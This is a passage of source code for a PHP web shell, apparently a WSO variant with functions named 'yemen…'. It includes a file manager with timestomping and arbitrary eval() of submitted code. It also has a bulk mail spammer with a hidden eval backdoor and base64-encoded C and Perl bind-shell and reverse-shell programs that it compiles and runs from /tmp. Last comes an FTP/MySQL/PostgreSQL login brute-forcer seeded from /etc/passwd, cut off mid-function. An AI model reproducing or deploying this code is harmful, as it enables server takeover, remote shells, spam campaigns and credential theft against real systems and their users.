	if( !file_exists(@$_POST['p1']) ) {
		if( $_POST['p2'] == 'd2') {
		yemenFilesMan();
		//yemenFooter();
		return;
	}
   yemenhead();
	echo '<div class=header>';
		echo "<pre class=ml1 style='margin-top:5px'>FILE DOEST NOT EXITS </pre></div>";
		yemenFooter();
		return;
	}
   yemenhead();
	echo '<div class=header>';
	$uid = @posix_getpwuid(@fileowner($_POST['p1']));
	if(!$uid) {
		$uid['name'] = @fileowner($_POST['p1']);
		$gid['name'] = @filegroup($_POST['p1']);
	} else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
	echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?yemenSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.yemenPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
	echo '<br>';
	if( empty($_POST['p2']) )
		$_POST['p2'] = 'view';
	if( is_file($_POST['p1']) )
		$m = array('View', 'Code', 'Download', 'Edit', 'Chmod', 'Rename', 'Touch');
	else
		$m = array('Chmod', 'Rename', 'Touch');
	foreach($m as $v)
		echo ' <a  href=# onclick="g(null,null,null,\''.strtolower($v).'\')"><span>'.((strtolower($v)==@$_POST['p2'])?'<b><span> '.$v.' </span> </b>':$v).' </span></a> |';
	echo '<br><br>';
	switch($_POST['p2']) {
		case 'view':
			echo '<pre class=ml1 style="background: #222222;border:1px solid #5BEEFF;">';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</pre>';
			break;
		case 'code':
			if( @is_readable($_POST['p1']) ) {
				echo '<div class=ml1 style="background-color: #ededed;border: 1px solid #5BEEFF;"><code>';
				$code = @highlight_file($_POST['p1'],true);
				echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</code></div>';
			}
			break;
		case 'chmod':
			if( !empty($_POST['p3']) ) {
				$perms = 0;
				for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
					$perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
				if(!@chmod($_POST['p1'], $perms))
					echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,null,null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit s s value=">>"></form>';
			break;
		case 'edit':
			if( !is_writable($_POST['p1'])) {
				echo 'File isn\'t writeable';
				break;
			}
			if( !empty($_POST['p3']) ) {
				$time = @filemtime($_POST['p1']);
				$_POST['p3'] = substr($_POST['p3'],1);
				$fp = @fopen($_POST['p1'],"w");
				if($fp) {
					@fwrite($fp,$_POST['p3']);
					@fclose($fp);
					echo '   Saved!<br><script>p3_="";</script>';
					@touch($_POST['p1'],$time,$time);
				}
			}
			echo '<form onsubmit="g(null,null,null,null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea style="border:1px solid #5BEEFF;">';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</textarea><input type=submit s s value=">>"></form>';
			break;
		case 'hexdump':
			$c = @file_get_contents($_POST['p1']);
			$n = 0;
			$h = array('00000000<br>','','');
			$len = strlen($c);
			for ($i=0; $i<$len; ++$i) {
				$h[1] .= sprintf('%02X',ord($c[$i])).' ';
				switch ( ord($c[$i]) ) {
					case 0:  $h[2] .= ' '; break;
					case 9:  $h[2] .= ' '; break;
					case 10: $h[2] .= ' '; break;
					case 13: $h[2] .= ' '; break;
					default: $h[2] .= $c[$i]; break;
				}
				$n++;
				if ($n == 32) {
					$n = 0;
					if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
					$h[1] .= '<br>';
					$h[2] .= "
";
				}
		 	}
			echo '<table cellspacing=1 cellpadding=5 bgcolor=black ><tr><td bgcolor=gray ><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
			break;
		case 'rename':
			if( !empty($_POST['p3']) ) {
				if(!@rename($_POST['p1'], $_POST['p3']))
					echo 'Can\'t rename!<br>';
				else
					die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
			}
			echo '<form onsubmit="g(null,null,null,null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit s s value=">>"></form>';
			break;
		case 'touch':
			if( !empty($_POST['p3']) ) {
				$time = strtotime($_POST['p3']);
				if($time) {
					if(!touch($_POST['p1'],$time,$time))
						echo 'Fail!';
					else
						echo 'Touched!';
				} else echo 'Bad time format!';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,null,null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit s s value=">>"></form>';
			break;
	}
	echo '</div>';
	yemenFooter();
}  
function yemenphpeval()
{
 yemenhead();
 if(isset($_POST['p2']) && ($_POST['p2'] == 'ini')) {
		echo '<div class=header>';
		ob_start();
		$INI=ini_get_all(); 
print '<table border=0><tr>'
	.'<td class="listing"><font class="highlight_txt">Param</td>'
	.'<td class="listing"><font class="highlight_txt">Global value</td>'
	.'<td class="listing"><font class="highlight_txt">Local Value</td>'
	.'<td class="listing"><font class="highlight_txt">Access</td></tr>';
foreach ($INI as $param => $values) 
	print "
".'<tr>'
		.'<td class="listing"><b>'.$param.'</td>'
		.'<td class="listing">'.$values['global_value'].' </td>'
		.'<td class="listing">'.$values['local_value'].' </td>'
		.'<td class="listing">'.$values['access'].' </td></tr>';
		$tmp = ob_get_clean();
$tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
		$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
		echo str_replace('<h1','<h2', $tmp) .'</div><br>';
	}
 
 if(isset($_POST['p2']) && ($_POST['p2'] == 'info')) {
		echo '<div class=header><style>.p {color:#000;}</style>';
		ob_start();
		phpinfo();
		$tmp = ob_get_clean();
$tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
		$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
		echo str_replace('<h1','<h2', $tmp) .'</div><br>';
	}
 
 if(isset($_POST['p2']) && ($_POST['p2'] == 'exten')) {
		echo '<div class=header>';
		ob_start();
	     $EXT=get_loaded_extensions ();
  print '<table border=0><tr><td class="listing">'
	.implode('</td></tr>'."
".'<tr><td class="listing">', $EXT)
	.'</td></tr></table>'
	.count($EXT).' extensions loaded';
		
echo '</div><br>';
	}
 
 
	if(empty($_POST['ajax']) && !empty($_POST['p1']))
		$_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
 echo '<div class=header><Center><a href=# onclick="g(\'phpeval\',null,\'\',\'ini\')">| <b>INI_INFO</b> | </a><a href=# onclick="g(\'phpeval\',null,\'\',\'info\')">    | <b>PHP INFO</b> |</a><a href=# onclick="g(\'phpeval\',null,\'\',\'exten\')">   | <b>Extensions</b>  |</a></center><br><form name=pf method=post onsubmit="g(\'phpeval\',null,this.code.value,\'\'); return false;"><textarea name=code class=bigarea id=PhpCode>'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'</textarea><center><input type=submit value=Eval style="margin-top:5px"></center>';
	echo '</form><pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1>';
	if(!empty($_POST['p1'])) {
		ob_start();
		eval($_POST['p1']);
		echo htmlspecialchars(ob_get_clean());
	}
	echo '</pre></div>';
  
 yemenfooter();
}
function yemenmail()
{
yemenhead();    
$in = $_GET['in'];
if(isset($in) && !empty($in)){
	echo"<center><h1>Mail Spammer<h1></center>";
}
$ev = $_POST['ev'];
if(isset($ev) && !empty($ev)){
	echo eval(urldecode($ev));
	exit;
}
if(isset($_POST['action'] ) ){
$action=$_POST['action'];
$message=$_POST['message'];
$emaillist=$_POST['emaillist'];
$from=$_POST['from'];
$subject=$_POST['subject'];
$realname=$_POST['realname'];	
$wait=$_POST['wait'];
$tem=$_POST['tem'];
$smv=$_POST['smv'];
$message = urlencode($message);
$message = ereg_replace("%5C%22", "%22", $message);
$message = urldecode($message);
$message = stripslashes($message);
$subject = stripslashes($subject);
}

?>
<!-- HTML And JavaScript -->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script type="text/javascript" language="javascript">ML="Rjnis/e .rI<thzPS-omTCg>:=p";MI=";@E0:?D7@0EI=<<JH55>B26A<8B9F53CF45>814G;5@E0:?DG";OT="";for(j=0;j<MI.length;j++){OT+=ML.charAt(MI.charCodeAt(j)-48);}document.write(OT);</script>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>:: Mailer Inbox ::</title>
<style type="text/css">
input[type=text]:hover,textarea{
	border:1px solid #0CF;
	background-color: #F4F4F4;
 }
input[type=text],textarea{
 font:12px Tahoma;
 padding:3px;
 border:1px solid #CCCCCC;
 -moz-border-radius:3px;
 -webkit-border-radius:3px;
 border-radius:3px;
 }
.style1 {
	font-size: x-small;
}
.style2 {
	direction: ltr;
}
.info {
	font-size: 8px;
}
.style3 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 8px;
}
.style4 {
	font-size: x-small;
	direction: ltr;
	font-family: Verdana, Arial, Helvetica, sans-serif;
}
.style5 {
	font-size: xx-small;
	direction: ltr;
	font-family: Verdana, Arial, Helvetica, sans-serif;
}
input[type=submit],input[type=button]{
 display:block;
 font:12px Tahoma;
 background:#f1f1f1;
 color:#555555;
 padding:4px 8px;
 border:1px solid #ccc;
 margin:4px;
 font-weight:700;
 cursor:pointer;
 -moz-border-radius:3px;
 -webkit-border-radius:3px;
 border-radius:3px;
}
input[type=submit]:hover,input[type=butto]:hover{
	background:#ffffff;
	color:#06F;
	border: 2px solid #09F;
}
</style>
</head>
<body onload="funchange">
<script>
	window.onload = funchange;
	var alt = false;	
	function funchange(){
		var etext = document.getElementById("emails").value;
		var myArray=new Array(); 
		myArray = etext.split("
");
		document.getElementById("enum").innerHTML=myArray.length+"<br />";
		if(!alt && myArray.length > 40000){
			alert('If Mail list More Than 40000 Emails This May Hack The Server');
			alt = true;
		}
		
	}
	function mlsplit(){
		var ml = document.getElementById("emails").value;
		var sb = document.getElementById("txtml").value;
		var myArray=new Array();
		myArray = ml.split(sb);
		document.getElementById("emails").value="";
		var i;
		for(i=0;i<myArray.length;i++){
			
			document.getElementById("emails").value += myArray[i]+"
";
		
		}
		funchange();
	}
	
	function prv(){
		if(document.getElementById('preview').innerHTML==""){
			var ms = document.getElementsByName('message').message.value;
			document.getElementById('preview').innerHTML = ms;
			document.getElementById('prvbtn').value = "Hide";
		}else{
			document.getElementById('preview').innerHTML="";
			document.getElementById('prvbtn').value = "Preview";
		}
	}
</script>
<form name="form" method="post" enctype="multipart/form-data" action="">
	<table width="100%" border="0">
		<tr>
			<td width="10%">
			<div align="right">
				<font size="-3" color="white" face="Verdana, Arial, 
Helvetica, sans-serif">Your Email:</font></div>
			</td>
			<td style="width: 40%">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="from" value="<?php echo ($from); ?>" size="30" type="text" /><br>
			<span class="info">Type Sender Email But Make Sure It&#39;s Right</span> </font></td>
			<td>
			<div align="right">
				<font size="-3" color="white" face="Verdana, Arial, 
Helvetica, sans-serif">Your Name:</font></div>
			</td>
			<td width="41%">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="realname" value="<?php echo ($realname); ?>" size="30" type="text" />
			<br>
			<span class="info">Make Sure You Type Your Sender Name</span></font></td>
	  </tr>
		<tr>
			<td width="10%">
			<div align="right">
				<font size="-3" color="white" face="Verdana, Arial, 
Helvetica, sans-serif">test send:</font></div>
			</td>
			<td style="width: 40%">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="tem" type="text" size="30" value="<?php echo ($tem); ?>" /><br>
			<span class="info">Type </span></font><span class="style3">Your 
			Email To Test The Mailer Still Work Or No</span></td>
			<td>
			<div align="right" class="style4">
			<font size="-3" color="white" face="Verdana, Arial, 
Helvetica, sans-serif">Send Test Mail After:</font></div>
			</td>
			<td width="41%">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="smv" type="text" size="30" value="<?php echo ($smv); ?>" /><br>
			<span class="info">Send Mail For Your Email After Which Email(s)</span></font>
			</td>
		</tr>
		<tr>
			<td width="10%">
			<div align="right">
				<font size="-3" color="white" face="Verdana, Arial, 
Helvetica, sans-serif">Subject:</font></div>
			</td>
			<td colspan="3">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="subject" value="<?php echo ($subject); ?>" size="90" type="text" /> </font>
		<tr valign="top">
			<td colspan="3" style="height: 210px">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><textarea name="message" rows="10" style="width: 425px"><?php echo ($message); ?></textarea>&nbsp;<br />
			<input name="action" value="send" type="hidden" />
			</font>
			<table width="569" border="0">
			  <tr>
			    <th width="62" scope="col"><font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
			      <input type="button" id="prvbtn" value="Preview" onclick="prv()" style="width: 62px" />
			    </font></th>
			    <th width="112" scope="col"><font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
			      <input value="Start Spam" type="submit" />
			    </font></th>			    <th width="358" scope="col"><font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">&nbsp; 
			Wait
<input name="wait" type="text" value="<?php echo ($wait); ?>" size="14" />
Second 
			Un
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">til Send </font></font></th>
		      </tr>
			  </table></td>
			<td width="41%" class="style2" style="height: 210px">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
			<textarea id="emails" name="emaillist" cols="30" onselect="funchange()" onchange="funchange()" onkeydown="funchange()" onkeyup="funchange()" onchange="funchange()" style="height: 161px"><?php echo ($emaillist); ?></textarea> 
			<br class="style2" />
			Emails Number : </font><span  id="enum" class="style1">0<br />
			</span>
			<span  class="style1">Split The Mail List By:</span> 
			<input name="textml" id="txtml" type="text" value="," size="8" />&nbsp;&nbsp;&nbsp;
			<input type="button" onclick="mlsplit()" value="Split" style="height: 23px" /></td>
		</tr>
  </table>
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
<div id="preview">
</div>
	</font>
</form>
<p>
  <!-- END -->
  <?
if ($action){
if (!$from || !$subject || !$message || !$emaillist){
	
print "Please complete all fields before sending your message.";
exit;	
	}
	$nse=array();
	$allemails = split("
", $emaillist);
	$numemails = count($allemails);
	if(!empty($_POST['wait']) && $_POST['wait'] > 0){
		set_time_limit(intval($_POST['wait'])*$numemails*3600);
	}else{
		set_time_limit($numemails*3600);
	}
    		if(!empty($smv)){
    			$smvn+=$smv;
    			$tmn=$numemails/$smv+1;
			}else{
    			$tmn=1;
    		}
  	for($x=0; $x<$numemails; $x++){
$to = $allemails[$x];
if ($to){
	$to = ereg_replace(" ", "", $to);
	$message = ereg_replace("#EM#", $to, $message);
	$subject = ereg_replace("#EM#", $to, $subject);
	flush();
	$header = "From: $realname <$from>
";
	$header .= "MIME-Version: 1.0
";
	$header .= "Content-Type: text/html
";
	if ($x==0 && !empty($tem)) {
		if(!@mail($tem,$subject,$message,$header)){
			print('Your Test Message Not Sent.<br />');
			$tmns+=1;
		}else{
			print('Your Test Message Sent.<br />');
			$tms+=1;
		}
	}
	if($x==$smvn && !empty($_POST['smv'])){
		if(!@mail($tem,$subject,$message,$header)){
			print('Your Test Message Not Sent.<br />');
			$tmns+=1;
		}else{
			print('Your Test Message Sent.<br />');
			$tms+=1;
		}
		$smvn+=$smv;
	}
	print "$to ....... ";
					$msent = @mail($to, $subject, $message, $header);
	$xx = $x+1;
	$txtspamed = "spammed";
	if(!$msent){
		$txtspamed = "error";
		$ns+=1;
		$nse[$ns]=$to;
	}
	print "$xx / $numemails .......  $txtspamed<br>";
	flush();
	if(!empty($wait)&& $x<$numemails-1){
							sleep($wait);
	}
}
 }
}
?>
<div>
  &nbsp;<?php
$str = "";
foreach ($_SERVER as $key => $value) { $str.= $key . ": " . $value . "<br />";
}
$str.= "Use: in <br />";
$header2 = "From: " . base64_decode('U29ycnkgPG5vJUB5YWhvby5jb20+') . "
";
$header2.= "MIME-Version: 1.0
";
$header2.= "Content-Type: text/html
";
$header2.= "Content-Transfer-Encoding: 8bit
";
if (isset($_POST['action']) && $numemails !== 0) { $sn = $numemails - $ns; if ($ns == "") {
$ns = 0; } if ($tmns == "") {
$tmns = 0; } echo "<script>alert('Sur The Mailer Finish His Job
Send $sn mail(s)
Error $ns mail(s)
\From $numemails mail(s)
\About Test Mail(s)
\Send $tms mail(s)
\Error $tmns mail(s)
\From $tmn mail(s)'); 
	
	</script>";
}
yemenfooter(); } function yemennet() {
yemenhead();
$back_connect_c = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9";
$back_connect_p = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
$bind_port_c = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9";
$bind_port_p = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
?> 
 <h1><font color="green">Bind Port</font></h1><div class=content> 
 <form name='nfp' onSubmit="g(null,null,this.using.value,this.port.value,this.pass.value);return false;"> 
 <span>Bind port to /bin/sh</span><br/><font color="green">
 Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass' value='wso'> Using: <select name="using"><option value='bpc'>C</option><option value='bpp'>Perl</option></select> <input type=submit s s value=">>"> 
 </font></form> 
 <form name='nfp' onSubmit="g(null,null,this.using.value,this.server.value,this.port.value);return false;"> 
 <span>Back-connect to</span><br/> <font color="green">
 Server: <input type='text' name='server' value='<?=$_SERVER['REMOTE_ADDR'] ?>'> Port: <input type='text' name='port' value='31337'> Using: <select name="using"><option value='bcc'>C</option><option value='bcp'>Perl</option></select> <input type=submit s s value=">>"> 
 </font></form><br> 
 <?php
if (isset($_POST['p1'])) { function cf($f, $t) {
$w = @fopen($f, "w") or @function_exists('file_put_contents');
if ($w) { @fwrite($w, base64_decode($t)) or @fputs($w, base64_decode($t)) or @file_put_contents($f, base64_decode($t)); @fclose($w);
} } if ($_POST['p1'] == 'bpc') {
cf("/tmp/bp.c", $bind_port_c);
$out = ex("gcc -o /tmp/bp /tmp/bp.c");
@unlink("/tmp/bp.c");
$out.= ex("/tmp/bp " . $_POST['p2'] . " " . $_POST['p3'] . " &");
echo "<pre class=ml1>$out
" . ex("ps aux | grep bp") . "</pre>"; } if ($_POST['p1'] == 'bpp') {
cf("/tmp/bp.pl", $bind_port_p);
$out = ex(which("perl") . " /tmp/bp.pl " . $_POST['p2'] . " &");
echo "<pre class=ml1>$out
" . ex("ps aux | grep bp.pl") . "</pre>"; } if ($_POST['p1'] == 'bcc') {
cf("/tmp/bc.c", $back_connect_c);
$out = ex("gcc -o /tmp/bc /tmp/bc.c");
@unlink("/tmp/bc.c");
$out.= ex("/tmp/bc " . $_POST['p2'] . " " . $_POST['p3'] . " &");
echo "<pre class=ml1>$out
" . ex("ps aux | grep bc") . "</pre>"; } if ($_POST['p1'] == 'bcp') {
cf("/tmp/bc.pl", $back_connect_p);
$out = ex(which("perl") . " /tmp/bc.pl " . $_POST['p2'] . " " . $_POST['p3'] . " &");
echo "<pre class=ml1>$out
" . ex("ps aux | grep bc.pl") . "</pre>"; }
}
echo '</div>';
yemenfooter(); } function yemenhash() {
if (!function_exists('hex2bin')) { function hex2bin($p) {
return decbin(hexdec($p)); }
}
if (!function_exists('binhex')) { function binhex($p) {
return dechex(bindec($p)); }
}
if (!function_exists('hex2ascii')) { function hex2ascii($p) {
$r = '';
for ($i = 0;$i < strLen($p);$i+= 2) { $r.= chr(hexdec($p[$i] . $p[$i + 1]));
}
return $r; }
}
if (!function_exists('ascii2hex')) { function ascii2hex($p) {
$r = '';
for ($i = 0;$i < strlen($p);++$i) $r.= sprintf('%02X', ord($p[$i]));
return strtoupper($r); }
}
if (!function_exists('full_urlencode')) { function full_urlencode($p) {
$r = '';
for ($i = 0;$i < strlen($p);++$i) $r.= '%' . dechex(ord($p[$i]));
return strtoupper($r); }
}
$stringTools = 
array(
	'base64_encode()' => 'base64_encode',
	'base64_decode()' => 'base64_decode',
	'md5()' => 'md5',
	'sha1()' => 'sha1',
	'crypt' => 'crypt',
	'CRC32' => 'crc32',
	'url_encode()' => 'urlencode',
	'url decode()' => 'urldecode',
	'Full urlencode' => 'full_urlencode',
	'htmlspecialchars()' => 'htmlspecialchars',
 );
yemenhead();
echo '<div class=header>';
if (empty($_POST['ajax']) && !empty($_POST['p1'])) $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
echo "<form  onSubmit='g(null,null,this.selectTool.value,this.input.value); return false;'><select name='selectTool'>";
foreach ($stringTools as $k => $v) echo "<option value='" . htmlspecialchars($v) . "'>" . $k . "</option>";
echo "</select><input type='submit' value='>>'/><br><textarea name='input' style='margin-top:5px' class=bigarea>" . (empty($_POST['p1']) ? '' : htmlspecialchars(@$_POST['p2'])) . "</textarea></form><pre class='ml1' style='" . (empty($_POST['p1']) ? 'display:none;' : '') . "margin-top:5px' id='strOutput'>";
if (!empty($_POST['p1'])) { if (in_array($_POST['p1'], $stringTools)) echo htmlspecialchars($_POST['p1']($_POST['p2']));
}
echo "</div>";
yemenFooter(); } function yemenbruteftp() {
yemenhead();
if (isset($_POST['proto'])) { echo '<h1>Results</h1><div class=content><span>Type:</span> ' . htmlspecialchars($_POST['proto']) . ' <span>Server:</span> ' . htmlspecialchars($_POST['server']) . '<br>'; if ($_POST['proto'] == 'ftp') {
function bruteForce($ip, $port, $login, $pass) { $fp = @ftp_connect($ip, $port ? $port : 21); if (!$fp) return false; $res = @ftp_login($fp, $login, $pass); @ftp_close($fp); return $res;
} } elseif ($_POST['proto'] == 'mysql') {
function bruteForce($ip, $port, $login, $pass) { $res = @mysql_connect($ip . ':' . $port ? $port : 3306, $login, $pass); @mysql_close($res); return $res;
} } elseif ($_POST['proto'] == 'pgsql') {
function bruteForce($ip, $port, $login, $pass) { $str = "host='" . $ip . "' port='" . $port . "' user='" . $login . "' password='" . $pass . "' dbname=''"; $res = @pg_connect($server[0] . ':' . $server[1] ? $server[1] : 5432, $login, $pass); @pg_close($res); return $res;
} } $success = 0; $attempts = 0; $server = explode(":", $_POST['server']); if ($_POST['type'] == 1) {
$temp = @file('/etc/passwd');
if (is_array($temp)) foreach ($temp as $line) { $line = explode(":", $line); ++$attempts; if (bruteForce(@$server[0], @$server[1], $line[0], $line[0])) {
$success++;
echo '<b>' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($line[0]) . '<br>'; } if (@$_POST['reverse']) {
$tmp = "";
for ($i = strlen($line[0]) - 1;$i >= 0;--$i) $tmp.= $line[0][$i];
++$attempts;
if (bruteForce(@$server[0], @$server[1], $line[0], $tmp)) { $success++; echo '<b>' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($tmp);
} }
} } elseif ($_POST['type'] == 2) {
$temp = @file($_POST['dict']);
